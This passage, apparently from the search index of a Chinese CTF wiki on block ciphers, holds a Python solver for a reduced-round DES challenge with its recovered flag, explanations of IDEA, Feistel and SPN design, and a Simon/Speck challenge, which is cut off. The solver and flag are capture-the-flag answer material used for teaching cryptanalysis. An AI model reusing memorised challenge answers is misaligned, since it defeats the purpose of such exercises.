0, 1, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 0, 0], [1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0]], [[1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0], [1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 0, 0], [1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0], [1, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0], [0, 1, 0, 1, 1, 1, 1, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 0], [0, 0, 0, 1, 1, 1, 1, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0], [0, 0, 0, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 0, 0, 1], [0, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0], [0, 0, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 1, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 0], [1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1], [1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 0, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0], [1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 1], [1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 1], [1, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 1, 1, 1], [1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1], [1, 1, 1, 0, 0, 0, 0, 0, 1, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1]]]\n\n    def permute(self, lst, tb):\n        return [lst[i-1] for i in tb]\n\n    def f(self,riti,subkeyi):\n        tmp = [i^j for i,j in zip(subkeyi,self.permute(riti,DES.E))]\n        return  self.permute(sum([[int(l) for l in str(bin(DES.Sbox[i][int(str(tmp[6*i])+str(tmp[6*i+5]),2)][int(\"\".join(str(j) for j in tmp[6*i+1:6*i+5]),2)])[2:].zfill(4))] for i in range(8)],[]),DES.Pbox)\n\n    def des_main(self,m,mark):\n        sbkey = self.subkey[0]\n        #if mark == 'e' else self.subkey[1]\n        # tmp =  self.permute([int(i) for i in list((m).ljust(64,\"0\"))],self.IP)\n        tmp =  [int(i) for i in list((m).ljust(64,\"0\"))]\n        global kkk\n        print(kkk)\n        for i in range(kkk):\n            tmp = tmp[32:] + [j^k for j,k in zip(tmp[:32],self.f(tmp[32:],sbkey[i if mark != 'd' else kkk-1-i]))]\n        return \"\".join([str(i) for i in self.permute(tmp[32:]+tmp[:32],self.IP_re)])\n\n    def des_encipher(self,m):\n        m = \"\".join([bin(ord(i))[2:].zfill(8) for i in m])\n        des_en = self.des_main(m,'e')\n        return \"\".join([chr(int(des_en[i*8:i*8+8],2)) for i in range(8)])\n\n    def des_decipher(self,c):\n        c = \"\".join([bin(ord(i))[2:].zfill(8) for i in c])\n        des_de = self.des_main(c,'d')\n        return \"\".join([chr(int(des_de[i*8:i*8+8],2)) for i in range(8)])\n\ndef test():\n    import base64\n    global kkk\n    while kkk &gt;=0:\n        desobj = DES()\n        # cipher = desobj.des_encipher(\"12345678\")\n        cipher = '\\x01\\x19\\xe1+\\x92\\xd9\\x15%'\n        message1 = desobj.des_decipher(cipher)\n        print(message1)\n        kkk -= 1\nif __name__=='__main__':\n    test()\n</code></pre> <p>\u89e3\u5bc6\u7ed3\u679c\uff08\u90e8\u5206\uff09\uff1a</p> <pre><code>14\nt-\u00cfE\u00cfx\u0090\u00a7\n13\ny0ur9Ood\n12\n\u00b5p^\u00db\u00e9=\u00b9\u0088\n11\n)\u00c1`r\u00fb\u00d5\u00fb\u009d\n</code></pre> <p>\u53ef\u4ee5\u770b\u51fan\u4e3a13\uff0cflag\u4e3a<code>flag{y0ur9Ood}</code></p>"},{"location":"crypto/blockcipher/des/#_8","title":"\u53c2\u8003","text":"<ul> <li>\u6e05\u534e\u5927\u5b66\u7814\u7a76\u751f\u6570\u636e\u5b89\u5168\u8bfe\u7a0b\u8bfe\u4ef6</li> <li>https://en.wikipedia.org/wiki/Data_Encryption_Standard</li> </ul>"},{"location":"crypto/blockcipher/idea/","title":"IDEA","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"crypto/blockcipher/idea/#_1","title":"\u6982\u8ff0","text":"<p>\u56fd\u9645\u6570\u636e\u52a0\u5bc6\u7b97\u6cd5\uff08International Data Encryption Algorithm\uff0cIDEA\uff09\uff0c\u6700\u65e9\u79f0\u4e3a\u6539\u826f\u5efa\u8bae\u52a0\u5bc6\u6807\u51c6\uff08Improved Proposed Encryption Standard\uff0cIPES\uff09\uff0c\u662f\u5bc6\u7801\u5b66\u4e0a\u4e00\u79cd\u5bf9\u79f0\u5bc6\u94a5\u5206\u7ec4\u5bc6\u7801\uff0c\u7531 James Massey \u4e0e\u6765\u5b66\u5609\u8bbe\u8ba1\uff0c\u57281991\u5e74\u9996\u6b21\u63d0\u51fa\u3002\u8fd9\u4e2a\u7b97\u6cd5\u7684\u63d0\u51fa\uff0c\u662f\u4e3a\u4e86\u53d6\u4ee3\u65e7\u6709\u7684\u6570\u636e\u52a0\u5bc6\u6807\u51c6 DES\u3002\uff08\u6765\u81ea\u7ef4\u57fa\u767e\u79d1\uff09</p>"},{"location":"crypto/blockcipher/idea/#_2","title":"\u57fa\u672c\u6d41\u7a0b","text":""},{"location":"crypto/blockcipher/idea/#_3","title":"\u5bc6\u94a5\u751f\u6210","text":"<p>IDEA \u5728\u52a0\u5bc6\u7684\u6bcf\u8f6e\u4e2d\u4f7f\u7528 6\u4e2a\u5bc6\u94a5\uff0c\u7136\u540e\u6700\u540e\u8f93\u51fa\u8f6e\u4f7f\u75284\u4e2a\u5bc6\u94a5\u3002\u6240\u4ee5\u4e00\u5171\u670952\u4e2a\u3002</p> <ol> <li>\u524d8\u4e2a\u5bc6\u94a5\u6765\u81ea\u4e0e\u8be5\u7b97\u6cd5\u6700\u521d\u7684\u5bc6\u94a5\uff0cK1 \u53d6\u81ea\u5bc6\u94a5\u7684\u9ad816\u6bd4\u7279\uff0cK8 \u53d6\u81ea\u5bc6\u94a5\u7684\u4f4e16\u6bd4\u7279\u3002</li> <li>\u5c06\u5bc6\u94a5\u5faa\u73af\u5de6\u79fb 25 \u4f4d\u83b7\u53d6\u4e0b\u4e00\u8f6e\u5bc6\u94a5\uff0c\u7136\u540e\u518d\u6b21\u5206\u4e3a8\u7ec4\u3002</li> </ol>"},{"location":"crypto/blockcipher/idea/#_4","title":"\u52a0\u5bc6\u6d41\u7a0b","text":"<p>IDEA \u52a0\u5bc6\u7684\u6570\u636e\u5757\u7684\u5927\u5c0f\u4e3a 64 \u6bd4\u7279\uff0c\u5176\u4f7f\u7528\u7684\u5bc6\u94a5\u957f\u5ea6\u4e3a128 \u6bd4\u7279\u3002\u8be5\u7b97\u6cd5\u4f1a\u5bf9\u8f93\u5165\u7684\u6570\u636e\u5757\u8fdb\u884c8\u6b21\u76f8\u540c\u7684\u53d8\u6362\uff0c\u53ea\u662f\u6bcf\u6b21\u4f7f\u7528\u7684\u5bc6\u94a5\u4e0d\u540c\uff0c\u6700\u540e\u4f1a\u8fdb\u884c\u4e00\u6b21\u8f93\u51fa\u53d8\u6362\u3002\u6bcf\u4e00\u8f6e\u7684\u64cd\u4f5c</p> <p></p> <p>\u53ef\u4ee5\u8f93\u5165\u548c\u8f93\u51fa\u90fd\u662f 16 \u6bd4\u7279\u4f4d\u4e00\u7ec4\u3002\u6bcf\u4e00\u8f6e\u7684\u4e3b\u8981\u6267\u884c\u7684\u8fd0\u7b97\u6709</p> <ul> <li>\u6309\u4f4d\u5f02\u6216\uff0c\u2295</li> <li>\u6a21\u52a0\uff0c\u6a21\u6570\u4e3a 2^{16} \uff0c\u229e</li> <li>\u6a21\u4e58\uff0c\u6a21\u6570\u4e3a 2^{16}+1 \uff0c\u2299\u3002\u4f46\u662f\u9700\u8981\u6ce8\u610f\u7684\u662f 0x0000 \u7684\u8f93\u5165\u4f1a\u88ab\u4fee\u6539\u4e3a 2^{16} \uff0c2^{16} \u7684\u8f93\u51fa\u7ed3\u679c\u4f1a\u88ab\u4fee\u6539\u4e3a0x0000\u3002</li> </ul> <p>\u8fd9\u91cc\u6211\u4eec\u79f0\u7531 K5\uff0cK6 \u6784\u6210\u7684\u4e2d\u95f4\u90a3\u4e2a\u65b9\u683c\u7684\u52a0\u5bc6\u65b9\u5f0f\u4e3aMA\u3002\u8fd9\u4e5f\u662f IDEA \u7b97\u6cd5\u4e2d\u91cd\u8981\u7684\u4e00\u90e8\u5206\uff0c\u6b64\u5916\uff0c\u6211\u4eec\u79f0 MA_L \u4e3a\u8be5\u90e8\u5206\u52a0\u5bc6\u540e\u7684\u5de6\u4fa7\u7ed3\u679c\uff0c\u5176\u6700\u540e\u4f1a\u548c\u6700\u5de6\u8fb9\u7684 16 \u6bd4\u7279\u64cd\u4f5c\uff1bMA_R \u4e3a\u8be5\u90e8\u5206\u52a0\u5bc6\u540e\u7684\u53f3\u534a\u90e8\u5206\u7684\u7ed3\u679c\uff0c\u5176\u6700\u540e\u4f1a\u548c\u7b2c\u4e09\u4e2a 16 \u6bd4\u7279\u64cd\u4f5c\u3002</p> <p>\u5728\u6700\u540e\u8f93\u51fa\u8f6e\u7684\u64cd\u4f5c\u5982\u4e0b</p> <p></p>"},{"location":"crypto/blockcipher/idea/#_5","title":"\u89e3\u5bc6\u6d41\u7a0b","text":"<p>\u89e3\u5bc6\u6d41\u7a0b\u4e0e\u52a0\u5bc6\u6d41\u7a0b\u76f8\u4f3c\uff0c\u4e3b\u8981\u5728\u4e8e\u5176\u5bc6\u94a5\u7684\u9009\u53d6</p> <ul> <li>\u7b2c i(1-9) \u8f6e\u7684\u89e3\u5bc6\u7684\u5bc6\u94a5\u7684\u524d 4 \u4e2a\u5b50\u5bc6\u94a5\u7531\u52a0\u5bc6\u8fc7\u7a0b\u4e2d\u7b2c10-i \u8f6e\u7684\u524d 4 \u4e2a\u5b50\u5bc6\u94a5\u5f97\u51fa</li> <li>\u5176\u4e2d\u7b2c 1 \u4e2a\u548c\u7b2c 4 \u4e2a\u89e3\u5bc6\u5b50\u5bc6\u94a5\u4e3a\u76f8\u5e94\u7684\u5b50\u5bc6\u94a5\u5173\u4e8e 2^{16}+1 \u7684\u4e58\u6cd5\u9006\u5143\u3002</li> <li>\u7b2c 2 \u4e2a\u548c\u7b2c 3 \u4e2a\u5b50\u5bc6\u94a5\u7684\u53d6\u6cd5\u4e3a<ul> <li>\u5f53\u8f6e\u6570\u4e3a2\uff0c...\uff0c8\u65f6\uff0c\u53d6\u76f8\u5e94\u7684\u7b2c3\u4e2a\u548c\u7b2c2\u4e2a\u7684\u5b50\u5bc6\u94a5\u76842^{16} \u7684\u52a0\u5bc6\u9006\u5143\u3002</li> <li>\u5f53\u8f6e\u6570\u4e3a 1 \u6216 9 \u65f6\uff0c\u53d6\u76f8\u5e94\u7684\u7b2c 2 \u4e2a\u548c\u7b2c 3 \u4e2a\u5b50\u5bc6\u94a5\u5bf9\u5e94\u76842^{16} \u7684\u52a0\u5bc6\u9006\u5143\u3002</li> </ul> </li> <li>\u7b2c 5 \u548c\u7b2c 6 \u4e2a\u5bc6\u94a5\u4e0d\u53d8\u3002</li> </ul>"},{"location":"crypto/blockcipher/idea/#_6","title":"\u603b\u4f53\u6d41\u7a0b","text":"<p>\u6211\u4eec\u6765\u8bc1\u660e\u4e00\u4e0b\u7b97\u6cd5\u7684\u6b63\u786e\u6027\uff0c\u8fd9\u91cc\u6211\u4eec\u5173\u6ce8\u4e8e\u89e3\u5bc6\u7b97\u6cd5\u7684\u7b2c\u4e00\u8f6e\uff0c\u9996\u5148\u6211\u4eec\u5148\u770b\u4e00\u4e0bY_i \u662f\u5982\u4f55\u5f97\u5230\u7684</p> <p>Y_1 = W_{81} \\odot Z_{49}</p> <p>Y_2=W_{83}\\boxplus Z_{50}</p> <p>Y_3=W_{82}\\boxplus Z_{51}</p> <p>Y_4=W_{83}\\odot Z_{52}</p> <p>\u89e3\u5bc6\u65f6\uff0c\u7b2c\u4e00\u8f6e\u76f4\u63a5\u8fdb\u884c\u7684\u53d8\u6362\u4e3a</p> <p>J_{11}=Y_1 \\odot U_1=Y_1 \\odot Z_{49}^{-1}=W_{81}</p> <p>J_{12}=Y_2 \\boxplus U2=Y_2\\boxplus Z_{50}^{-1}=W_{83}</p> <p>J_{13}=Y_3 \\boxplus U3=Y_3\\boxplus Z_{51}^{-1}=W_{82}</p> <p>J_{14}=Y_4 \\odot U_4=Y_4 \\odot Z_{52}^{-1}=W_{84}</p> <p>\u53ef\u4ee5\u770b\u51fa\u5f97\u5230\u7684\u7ed3\u679c\u53ea\u6709\u4e2d\u95f4\u7684\u4e24\u4e2a16\u4f4d\u52a0\u5bc6\u7ed3\u679c\u6070\u597d\u76f8\u53cd\u3002\u6211\u4eec\u8fdb\u4e00\u6b65\u770b\u4e00\u4e0bW_{8i} \u662f\u5982\u4f55\u5f97\u5230\u7684\u3002</p> <p>W_{81}=I_{81} \\oplus MA_R(I_{81}\\oplus I_{83},I_{82}\\oplus I_{84})</p> <p>W_{82}=I_{83} \\oplus MA_R(I_{81}\\oplus I_{83},I_{82}\\oplus I_{84})</p> <p>W_{83}=I_{82} \\oplus MA_L(I_{81}\\oplus I_{83},I_{82}\\oplus I_{84})</p> <p>W_{84}=I_{84} \\oplus MA_L(I_{81}\\oplus I_{83},I_{82}\\oplus I_{84})</p> <p>\u90a3\u4e48\u5bf9\u4e8eV11\u6765\u8bf4</p> <p>V_{11}=J_{11} \\oplus MA_R(J_{11}\\oplus J_{13},J_{12}\\oplus J_{14})</p> <p>\u901a\u8fc7\u7b80\u5355\u5e26\u5165\u5df2\u6709\u7684\u503c\uff0c\u663e\u7136</p> <p>V_{11}=W_{81} \\oplus MA_R(I_{81}\\oplus I_{83},I_{82} \\oplus I_{84})=I_{81}</p> <p>\u5bf9\u4e8e\u5176\u4ed6\u7684\u5143\u7d20\u4e5f\u7c7b\u4f3c\uff0c\u90a3\u4e48\u5176\u5b9e\u6211\u4eec\u4f1a\u53d1\u73b0\u7b2c\u4e00\u8f6e\u89e3\u5bc6\u540e\u7684\u7ed3\u679c\u6070\u597d\u662fI_{81},I_{83},I_{82},I_{84}\u3002</p> <p>\u7c7b\u4f3c\u5730\uff0c\u8fd9\u4e2a\u5173\u7cfb\u53ef\u4ee5\u4e00\u76f4\u6ee1\u8db3\u76f4\u5230</p> <p>V_{81}=I_{11},V_{82}=I_{13},V_{83}=I_{12},V_{84}=I_{14}</p> <p>\u90a3\u4e48\u6700\u540e\u518d\u7ecf\u8fc7\u4e00\u6b21\u7b80\u5355\u7684\u8f93\u51fa\u53d8\u6362\uff0c\u6070\u597d\u5f97\u5230\u6700\u521d\u52a0\u5bc6\u7684\u6570\u503c\u3002</p> <p></p>"},{"location":"crypto/blockcipher/idea/#_7","title":"\u9898\u76ee","text":"<ul> <li>2017 HITCON seccomp</li> </ul>"},{"location":"crypto/blockcipher/introduction/","title":"\u5757\u52a0\u5bc6","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"crypto/blockcipher/introduction/#_2","title":"\u6982\u8ff0","text":"<p>\u6240\u8c13\u5757\u52a0\u5bc6\u5c31\u662f\u6bcf\u6b21\u52a0\u5bc6\u4e00\u5757\u660e\u6587\uff0c\u5e38\u89c1\u7684\u52a0\u5bc6\u7b97\u6cd5\u6709</p> <ul> <li>IDEA \u52a0\u5bc6</li> <li>DES \u52a0\u5bc6</li> <li>AES \u52a0\u5bc6</li> </ul> <p>\u5757\u52a0\u5bc6\u4e5f\u662f\u5bf9\u79f0\u52a0\u5bc6\u3002</p> <p>\u5176\u5b9e\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u628a\u5757\u52a0\u5bc6\u7406\u89e3\u4e00\u79cd\u7279\u6b8a\u7684\u66ff\u4ee3\u5bc6\u7801\uff0c\u4f46\u662f\u5176\u6bcf\u6b21\u66ff\u4ee3\u7684\u662f\u4e00\u5927\u5757\u3002\u800c\u6b63\u662f\u7531\u4e8e\u4e00\u5927\u5757\uff0c\u660e\u6587\u7a7a\u95f4\u5de8\u5927\uff0c\u800c\u4e14\u5bf9\u4e8e\u4e0d\u540c\u7684\u5bc6\u94a5\uff0c\u6211\u4eec\u65e0\u6cd5\u505a\u4e00\u4e2a\u8868\u8fdb\u884c\u5bf9\u5e94\u76f8\u5e94\u7684\u5bc6\u6587\uff0c\u56e0\u6b64\u5fc5\u987b\u5f97\u6709 \u590d\u6742 \u7684\u52a0\u89e3\u5bc6\u7b97\u6cd5\u6765\u52a0\u89e3\u5bc6\u660e\u5bc6\u6587\u3002</p> <p>\u800c\u4e0e\u6b64\u540c\u65f6\uff0c\u660e\u6587\u5f80\u5f80\u53ef\u80fd\u5f88\u957f\u4e5f\u53ef\u80fd\u5f88\u77ed\uff0c\u56e0\u6b64\u5728\u5757\u52a0\u5bc6\u65f6\u5f80\u5f80\u9700\u8981\u4e24\u4e2a\u8f85\u52a9</p> <ul> <li>padding\uff0c\u5373 padding \u5230\u6307\u5b9a\u5206\u7ec4\u957f\u5ea6</li> <li>\u5206\u7ec4\u52a0\u5bc6\u6a21\u5f0f\uff0c\u5373\u660e\u6587\u5206\u7ec4\u52a0\u5bc6\u7684\u65b9\u5f0f\u3002</li> </ul>"},{"location":"crypto/blockcipher/introduction/#_3","title":"\u57fa\u672c\u7b56\u7565","text":"<p>\u5728\u5206\u7ec4\u5bc6\u7801\u8bbe\u8ba1\u65f6\uff0c\u5145\u5206\u4f7f\u7528\u4e86 Shannon \u63d0\u51fa\u7684\u4e24\u5927\u7b56\u7565\uff1a\u6df7\u6dc6\u4e0e\u6269\u6563\u4e24\u5927\u7b56\u7565\u3002</p>"},{"location":"crypto/blockcipher/introduction/#_4","title":"\u6df7\u6dc6","text":"<p>\u6df7\u6dc6\uff0cConfusion\uff0c\u5c06\u5bc6\u6587\u4e0e\u5bc6\u94a5\u4e4b\u95f4\u7684\u7edf\u8ba1\u5173\u7cfb\u53d8\u5f97\u5c3d\u53ef\u80fd\u590d\u6742\uff0c\u4f7f\u5f97\u653b\u51fb\u8005\u5373\u4f7f\u83b7\u53d6\u4e86\u5bc6\u6587\u7684\u4e00\u4e9b\u7edf\u8ba1\u7279\u6027\uff0c\u4e5f\u65e0\u6cd5\u63a8\u6d4b\u5bc6\u94a5\u3002\u4e00\u822c\u4f7f\u7528\u590d\u6742\u7684\u975e\u7ebf\u6027\u53d8\u6362\u53ef\u4ee5\u5f97\u5230\u5f88\u597d\u7684\u6df7\u6dc6\u6548\u679c\uff0c\u5e38\u89c1\u7684\u65b9\u6cd5\u5982\u4e0b</p> <ul> <li>S \u76d2</li> <li>\u4e58\u6cd5</li> </ul>"},{"location":"crypto/blockcipher/introduction/#_5","title":"\u6269\u6563","text":"<p>\u6269\u6563\uff0cDiffusion\uff0c\u4f7f\u5f97\u660e\u6587\u4e2d\u7684\u6bcf\u4e00\u4f4d\u5f71\u54cd\u5bc6\u6587\u4e2d\u7684\u8bb8\u591a\u4f4d\u3002\u5e38\u89c1\u7684\u65b9\u6cd5\u6709</p> <ul> <li>\u7ebf\u6027\u53d8\u6362</li> <li>\u7f6e\u6362</li> <li>\u79fb\u4f4d\uff0c\u5faa\u73af\u79fb\u4f4d</li> </ul>"},{"location":"crypto/blockcipher/introduction/#_6","title":"\u5e38\u89c1\u52a0\u89e3\u5bc6\u7ed3\u6784","text":"<p>\u76ee\u524d\u5757\u52a0\u5bc6\u4e2d\u4e3b\u8981\u4f7f\u7528\u7684\u662f\u7ed3\u6784\u662f</p> <ul> <li>\u8fed\u4ee3\u7ed3\u6784\uff0c\u8fd9\u662f\u56e0\u4e3a\u8fed\u4ee3\u7ed3\u6784\u4fbf\u4e8e\u8bbe\u8ba1\u4e0e\u5b9e\u73b0\uff0c\u540c\u65f6\u65b9\u4fbf\u5b89\u5168\u6027\u8bc4\u4f30\u3002</li> </ul>"},{"location":"crypto/blockcipher/introduction/#_7","title":"\u8fed\u4ee3\u7ed3\u6784","text":""},{"location":"crypto/blockcipher/introduction/#_8","title":"\u6982\u8ff0","text":"<p>\u8fed\u4ee3\u7ed3\u6784\u57fa\u672c\u5982\u4e0b\uff0c\u4e00\u822c\u5305\u62ec\u4e09\u4e2a\u90e8\u5206</p> <ul> <li>\u5bc6\u94a5\u7f6e\u6362</li> <li>\u8f6e\u52a0\u5bc6\u51fd\u6570</li> <li>\u8f6e\u89e3\u5bc6\u51fd\u6570</li> </ul> <p></p>"},{"location":"crypto/blockcipher/introduction/#_9","title":"\u8f6e\u51fd\u6570","text":"<p>\u76ee\u524d\u6765\u8bf4\uff0c\u8f6e\u51fd\u6570\u4e3b\u8981\u6709\u4e3b\u8981\u6709\u4ee5\u4e0b\u8bbe\u8ba1\u65b9\u6cd5</p> <ul> <li>Feistel Network\uff0c\u7531 Horst Feistel \u53d1\u660e\uff0cDES \u8bbe\u8ba1\u8005\u4e4b\u4e00\u3002<ul> <li>DES</li> </ul> </li> <li>Substitution-Permutation Network(SPN)<ul> <li>AES</li> </ul> </li> <li>\u5176\u4ed6\u65b9\u6848</li> </ul>"},{"location":"crypto/blockcipher/introduction/#_10","title":"\u5bc6\u94a5\u6269\u5c55","text":"<p>\u76ee\u524d\uff0c\u5bc6\u94a5\u6269\u5c55\u7684\u65b9\u6cd5\u6709\u5f88\u591a\uff0c\u6ca1\u6709\u89c1\u5230\u4ec0\u4e48\u5b8c\u7f8e\u7684\u5bc6\u94a5\u6269\u5c55\u65b9\u6cd5\uff0c\u57fa\u672c\u539f\u5219\u662f\u4f7f\u5f97\u5bc6\u94a5\u7684\u6bcf\u4e00\u4e2a\u6bd4\u7279\u5c3d\u53ef\u80fd\u5f71\u54cd\u591a\u8f6e\u7684\u8f6e\u5bc6\u94a5\u3002</p>"},{"location":"crypto/blockcipher/simon-speck/","title":"Simon and Speck Block Ciphers","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u8fd9\u662f\u4e00\u7ec4\u59d0\u59b9\u8f7b\u91cf\u7ea7\u52a0\u5bc6\u3002</p>"},{"location":"crypto/blockcipher/simon-speck/#simon-block-cipher","title":"Simon Block Cipher","text":""},{"location":"crypto/blockcipher/simon-speck/#_1","title":"\u57fa\u672c\u4ecb\u7ecd","text":"<p>Simon \u5757\u52a0\u5bc6\u7b97\u6cd5\u7531 NSA 2013 \u5e74 6 \u6708\u516c\u5e03\uff0c\u4e3b\u8981\u5728\u786c\u4ef6\u5b9e\u73b0\u4e0a\u8fdb\u884c\u4e86\u4f18\u5316\u3002</p> <p>Simon Block Cipher \u662f\u5e73\u8861\u7684 Feistel cipher \u52a0\u5bc6\uff0c\u4e00\u5171\u6709\u4e24\u5757\uff0c\u82e5\u6bcf\u5757\u52a0\u5bc6\u7684\u5927\u5c0f\u4e3a n bits\uff0c\u90a3\u4e48\u660e\u6587\u7684\u5927\u5c0f\u5c31\u662f 2n bits\u3002\u6b64\u5916\uff0c\u4e00\u822c\u6765\u8bf4\uff0c\u8be5\u52a0\u5bc6\u4e2d\u6240\u4f7f\u7528\u7684\u5bc6\u94a5\u957f\u5ea6\u662f\u5757\u957f\u5ea6\u7684\u6574\u6570\u500d\uff0c\u6bd4\u5982 2n\uff0c4n\u7b49\u3002\u5e38\u89c1\u7684 Simon \u52a0\u5bc6\u7b97\u6cd5\u6709</p> <p></p> <p>\u4e00\u822c\u6765\u8bf4\uff0cSimon \u7b97\u6cd5\u79f0\u4e4b\u4e3a  Simon 2n/nm\uff0cn \u4e3a\u5757\u5927\u5c0f\uff0cm \u662f\u5757\u5927\u5c0f\u4e0e\u5bc6\u94a5\u4e4b\u95f4\u7684\u500d\u6570\u3002\u6bd4\u5982\u8bf4 Simon 48/96 \u5c31\u662f\u6307\u660e\u6587\u662f 48 \u6bd4\u7279\uff0c\u5bc6\u94a5\u662f 96 \u6bd4\u7279\u7684\u52a0\u5bc6\u7b97\u6cd5\u3002</p> <p>\u6b64\u5916\uff0c\u5bf9\u4e8e Simon \u5757\u52a0\u5bc6\u7b97\u6cd5\u6765\u8bf4\uff0c\u6bcf\u8f6e\u7684\u52a0\u5bc6\u8fc7\u7a0b\u4e00\u6837\uff0c\u5982\u4e0b</p> <p></p> <p>\u5f53\u7136\uff0c\u5bf9\u4e8e\u6bcf\u4e00\u8f6e\u4ee5\u53ca\u4e0d\u540c\u7684 m \u6765\u8bf4\uff0c\u5bc6\u94a5\u4e5f\u4f1a\u6709\u6240\u4e0d\u540c</p> <p></p> <p>\u5176\u4e2d\uff0c z_j \u662f\u7531 Linear Feedback Shift Register (LFSR) \u751f\u6210\u7684\uff0c\u867d\u7136\u5bf9\u4e8e\u4e0d\u540c\u7684 z_j \u7684\u903b\u8f91\u4e0d\u540c\uff0c\u4f46\u662f\u521d\u59cb\u5411\u91cf\u662f\u56fa\u5b9a\u7684\u3002</p> Constant z_{0}=11111010001001010110000111001101111101000100101011000011100110 z_{1}=10001110111110010011000010110101000111011111001001100001011010 z_{2}=10101111011100000011010010011000101000010001111110010110110011 z_{3}=11011011101011000110010111100000010010001010011100110100001111 z_{4}=11010001111001101011011000100000010111000011001010010011101111"},{"location":"crypto/blockcipher/simon-speck/#2017-seccon-simon-and-speck-block-ciphers","title":"2017 SECCON Simon and Speck Block Ciphers","text":"<p>\u9898\u76ee\u63cf\u8ff0\u5982\u4e0b</p> <pre><code>Simon and Speck Block Ciphers\n\nhttps://eprint.iacr.org/2013/404.pdf Simon_96_64, ECB, key=\"SECCON{xxxx}\", plain=0x6d564d37426e6e71, cipher=0xbb5d12ba422834b5\n</code></pre> <p>\u4ece\u540d\u5b57\u4e2d\u53ef\u4ee5\u770b\u51fa\u5bc6\u94a5\u662f 96 \u6bd4\u7279\uff0812 byte\uff09\uff0c\u660e\u6587\u662f 64 \u6bd4\u7279\uff088\u5b57\u8282\uff09\uff0c\u800c\u5bc6\u94a5\u5df2\u7ecf\u7ed9\u51fa\u4e86 